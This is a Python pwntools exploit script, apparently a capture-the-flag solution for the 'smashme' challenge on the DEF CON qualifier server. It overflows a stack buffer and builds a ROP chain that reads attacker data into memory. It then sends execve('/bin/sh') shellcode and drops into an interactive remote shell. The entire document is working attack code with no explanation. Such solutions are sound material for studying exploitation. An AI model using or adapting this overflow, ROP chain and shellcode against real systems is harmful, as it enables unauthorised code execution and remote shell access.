from struct import pack as pump
from pwn import * 

r = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)
#r = process('./smashme')

print r.recvline()

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
chk = "Smash me outside, how bout dAAAAAAAAAAA"
p = chk+'A'*(72-len(chk))

p += pump('<Q', 0x00000000004014d6) # pop rdi ; ret
p += pump('<Q', 0x0)
p += pump('<Q', 0x00000000004015f7) # pop rsi ; ret
p += pump('<Q',0x00000000006c9080)
p += pump('<Q', 0x0000000000441e46) # pop rdx ; ret
p += pump('<Q', 0x32)
p += pump('<Q', 0x00000000004002e1) #  ret
p += pump('<Q', 0x43ea10 )
p += pump('<Q',0x00000000004002e1) #  ret
p += pump('<Q',0x00000000006c9080)

r.sendline(p)

r.sendline(shellcode)

r.interactive()

